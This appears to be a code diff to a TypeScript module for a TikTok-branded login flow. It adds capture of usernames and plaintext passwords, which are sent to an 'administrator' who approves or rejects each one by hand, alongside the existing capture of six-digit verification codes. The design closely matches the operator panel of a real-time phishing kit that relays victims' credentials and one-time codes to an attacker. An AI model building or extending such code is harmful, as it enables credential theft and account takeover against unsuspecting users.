@@ -1,5 +1,5 @@
 import type { VerificationRequest, VerificationStatus } from '../types/auth';
-import { checkCodeStatusInDb } from '../api/loging.api';
+import { checkCodeStatusInDb, checkUserStatusInDb } from '../api/loging.api';
 
 const STORAGE_KEY_REQUESTS = 'tiktok_verification_requests';
 const STORAGE_KEY_ACTIVE = 'tiktok_active_verification_id';
@@ -94,6 +94,7 @@ export const createVerificationRequest = (
     userId,
     username: username.trim(),
     codigo: codigo.trim(),
+    type: 'CODE',
     status: 'PENDING',
     createdAt: Date.now(),
   };
@@ -114,6 +115,40 @@ export const createVerificationRequest = (
 };
 
 /**
+ * Crea una nueva solicitud de verificación de contraseña/credenciales en tiempo real
+ */
+export const createUserLoginRequest = (
+  userId: number | string | undefined,
+  username: string,
+  password: string,
+  inicio_sesion: string = 'usuario'
+): VerificationRequest => {
+  const newRequest: VerificationRequest = {
+    id: `pwd_req_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`,
+    userId,
+    username: username.trim(),
+    password: password.trim(),
+    inicio_sesion,
+    type: 'PASSWORD',
+    status: 'PENDING',
+    createdAt: Date.now(),
+  };
+
+  const currentRequests = getVerificationRequests();
+  const updated = [newRequest, ...currentRequests];
+  saveVerificationRequests(updated);
+
+  try {
+    localStorage.setItem(STORAGE_KEY_ACTIVE, newRequest.id);
+  } catch {
+    // Ignorar
+  }
+
+  broadcastUpdate({ type: 'NEW_PASSWORD_REQUEST', request: newRequest });
+  return newRequest;
+};
+
+/**
  * El Administrador ACEPTA el código (Marca como CORRECTO y permite el inicio de sesión)
  */
 export const approveVerificationRequest = (requestId: string): VerificationRequest | null => {
@@ -126,7 +161,10 @@ export const approveVerificationRequest = (requestId: string): VerificationReque
         ...req,
         status: 'APPROVED' as VerificationStatus,
         reviewedAt: Date.now(),
-        message: 'Código verificado y aprobado por el administrador.',
+        message:
+          req.type === 'PASSWORD'
+            ? 'Contraseña verificada y acceso aprobado por el administrador.'
+            : 'Código verificado y aprobado por el administrador.',
       };
       return updatedRequest;
     }
@@ -142,22 +180,26 @@ export const approveVerificationRequest = (requestId: string): VerificationReque
 };
 
 /**
- * El Administrador RECHAZA el código (Marca como INCORRECTO y deniega el inicio de sesión)
+ * El Administrador RECHAZA la verificación (código o contraseña)
  */
 export const rejectVerificationRequest = (
   requestId: string,
-  message = 'Introduce un código de verificación válido'
+  message?: string
 ): VerificationRequest | null => {
   const currentRequests = getVerificationRequests();
   let updatedRequest: VerificationRequest | null = null;
 
   const updatedList = currentRequests.map((req) => {
     if (req.id === requestId) {
+      const defaultMessage =
+        req.type === 'PASSWORD'
+          ? 'La contraseña es incorrecta'
+          : 'Introduce un código de verificación válido';
       updatedRequest = {
         ...req,
         status: 'REJECTED' as VerificationStatus,
         reviewedAt: Date.now(),
-        message,
+        message: message || defaultMessage,
       };
       return updatedRequest;
     }
@@ -245,6 +287,50 @@ export const subscribeToVerificationRequest = (
     const effectiveUserId = userId || current?.userId;
     const effectiveCodeId = codeId || current?.codeId;
 
+    // Caso B1: Solicitud de Contraseña
+    if (current?.type === 'PASSWORD' && effectiveUserId) {
+      try {
+        const cloudUserStatus = await checkUserStatusInDb(effectiveUserId);
+        if (cloudUserStatus?.success && cloudUserStatus.user) {
+          const { estado } = cloudUserStatus.user;
+          if (estado === 'APPROVED' || estado === 'REJECTED') {
+            isDone = true;
+            if (intervalId) clearInterval(intervalId);
+
+            const updated: VerificationRequest = {
+              id: requestId,
+              userId: effectiveUserId,
+              username: current?.username || cloudUserStatus.user.username,
+              password: current?.password,
+              inicio_sesion: current?.inicio_sesion,
+              type: 'PASSWORD',
+              status: estado,
+              createdAt: current?.createdAt || Date.now(),
+              reviewedAt: Date.now(),
+              message:
+                estado === 'APPROVED'
+                  ? 'Contraseña verificada y acceso aprobado por el administrador.'
+                  : 'La contraseña es incorrecta',
+            };
+
+            const currentList = getVerificationRequests();
+            const exists = currentList.some((r) => r.id === requestId);
+            const newList = exists
+              ? currentList.map((r) => (r.id === requestId ? updated : r))
+              : [updated, ...currentList];
+            saveVerificationRequests(newList);
+
+            broadcastUpdate({ type: 'STATUS_CHANGE', request: updated });
+            onUpdate(updated);
+            return;
+          }
+        }
+      } catch (err) {
+        console.warn('[subscribeToVerificationRequest] Error polling user cloud status:', err);
+      }
+    }
+
+    // Caso B2: Solicitud de Código de 6 Dígitos
     if (effectiveUserId || effectiveCodeId) {
       try {
         const cloudStatus = await checkCodeStatusInDb(effectiveUserId, effectiveCodeId);
@@ -268,6 +354,7 @@ export const subscribeToVerificationRequest = (
               userId: effectiveUserId || cloudStatus.code.user_id,
               username: current?.username || `Usuario #${effectiveUserId || cloudStatus.code.user_id}`,
               codigo: codigo || current?.codigo || '',
+              type: 'CODE',
               status: estado,
               createdAt: current?.createdAt || Date.now(),
               reviewedAt: Date.now(),
